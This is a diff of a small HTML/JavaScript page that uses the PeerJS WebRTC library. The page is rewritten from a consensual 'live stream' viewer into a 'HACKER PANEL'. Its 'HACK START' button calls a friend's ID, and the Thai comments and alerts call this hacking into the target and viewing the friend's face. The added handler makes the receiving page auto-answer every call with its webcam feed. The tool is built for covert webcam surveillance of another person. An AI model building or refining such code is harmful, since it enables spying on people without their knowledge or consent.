@@ -1,100 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>LIVE STREAM 4:3</title>
+    <title>HACKER PANEL v.03</title>
     <style>
-        body { background: #000; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        body { background: #000; color: #00ff00; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Courier New', monospace; }
         
-        /* ล็อกขนาดจอวิดีโอเป็น 4:3 */
-        .video-container {
+        .monitor-frame {
             position: relative;
-            width: 80vh; /* ปรับขนาดตามความสูงจอ */
+            width: 80vh; 
             aspect-ratio: 4 / 3;
             background: #111;
-            border: 2px solid #333;
+            border: 3px solid #00ff00;
             display: flex;
             justify-content: center;
             align-items: center;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
         }
 
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* ให้ภาพเต็มกรอบ 4:3 */
-            transform: scaleX(-1); /* กลับด้านกระจกให้ดูเป็นธรรมชาติ */
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+        .controls { margin-top: 20px; display: flex; gap: 10px; z-index: 10; }
+
+        input {
+            background: #000; border: 1px solid #00ff00; color: #00ff00;
+            padding: 10px; width: 250px; outline: none; font-family: monospace;
         }
 
-        .overlay {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            color: #00ff00;
-            font-size: 14px;
-            text-shadow: 1px 1px 2px #000;
-            pointer-events: none;
+        button {
+            background: #00ff00; color: #000; border: none;
+            padding: 10px 20px; cursor: pointer; font-weight: bold;
         }
 
-        #status {
-            position: absolute;
-            bottom: 10px;
-            width: 100%;
-            text-align: center;
-            color: rgba(255,255,255,0.5);
-            font-size: 12px;
-        }
+        button:hover { background: #008800; color: #fff; }
+
+        .overlay { position: absolute; top: 10px; left: 10px; font-size: 14px; pointer-events: none; }
+        #my-id-display { position: absolute; bottom: 10px; font-size: 12px; color: #888; }
     </style>
 </head>
 <body>
 
-    <div class="video-container">
-        <div class="overlay">● LIVE 4:3 HD</div>
+    <div class="monitor-frame">
+        <div class="overlay">● CONNECTED_STREAM_4:3</div>
         <video id="remote-video" autoplay playsinline></video>
-        <div id="status">WAITING FOR CONNECTION...</div>
     </div>
+
+    <div class="controls">
+        <input type="text" id="target-id" placeholder="ใส่ ID ของเพื่อนที่นี่...">
+        <button onclick="connectToFriend()">HACK START</button>
+    </div>
+
+    <div id="my-id-display">กำลังเตรียมระบบ...</div>
 
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     
     <script>
         const remoteVideo = document.getElementById('remote-video');
-        const status = document.getElementById('status');
+        const targetInput = document.getElementById('target-id');
+        const idDisplay = document.getElementById('my-id-display');
         
+        // 1. สร้าง ID ของเราเอง (และเตรียมรับสาย)
         const peer = new Peer(); 
 
         peer.on('open', (id) => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetId = urlParams.get('call');
-            
-            if (targetId) {
-                // ส่วนของเพื่อน: ส่งกล้องไปหาเรา
-                startMyCam(targetId);
-            } else {
-                // ส่วนของเรา: รอรับกล้องจากเพื่อน
-                status.innerText = "YOUR ID: " + id;
-                console.log("Link to share: " + window.location.href + "?call=" + id);
-            }
+            idDisplay.innerText = "YOUR SYSTEM ID: " + id;
         });
 
-        async function startMyCam(targetId) {
+        // 2. ฟังก์ชันเมื่อเรากดปุ่มเพื่อไป "ดูหน้าเพื่อน"
+        async function connectToFriend() {
+            const friendId = targetInput.value;
+            if (!friendId) { alert("กรุณาใส่ ID เพื่อนก่อน!"); return; }
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { aspectRatio: 1.333, width: 640, height: 480 } 
+                // ขอเปิดกล้องฝั่งเรานิดหน่อยตามระบบของ WebRTC (ถ้าไม่อยากให้เพื่อนเห็นเรา ให้ใช้ stream เปล่าๆ)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // โทรหา ID เพื่อน
+                const call = peer.call(friendId, stream);
+                
+                call.on('stream', (remoteStream) => {
+                    // พอเพื่อนรับสาย (แบบออโต้) ภาพเพื่อนจะมาโผล่ที่จอเรา
+                    remoteVideo.srcObject = remoteStream;
                 });
-                remoteVideo.srcObject = stream; // เพื่อนเห็นหน้าตัวเอง
-                peer.call(targetId, stream);    // ส่งภาพมาให้เรา
-                status.innerText = "STREAMING TO MASTER...";
+
+                alert("กำลังเจาะระบบเข้าเครื่องเป้าหมาย...");
             } catch (err) {
-                status.innerText = "CAMERA ERROR: " + err.message;
+                alert("เกิดข้อผิดพลาด: " + err.message);
             }
         }
 
-        // เมื่อมีคนโทรเข้ามา (เราเป็นคนรับภาพ)
+        // 3. ส่วนสำคัญ: เครื่องเพื่อนต้อง "รับสายอัตโนมัติ"
         peer.on('call', (call) => {
-            call.answer();
-            call.on('stream', (remoteStream) => {
-                remoteVideo.srcObject = remoteStream; // เราเห็นหน้าเพื่อน
-                status.innerText = "CONNECTED - RECEIVING FEED";
+            // เมื่อมีคน (เรา) โทรไปหาเพื่อน เครื่องเพื่อนจะส่งภาพกลับมาทันที
+            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+                call.answer(stream);
+                call.on('stream', (remoteStream) => {
+                    remoteVideo.srcObject = remoteStream;
+                });
             });
         });
+
     </script>
 </body>
 </html>
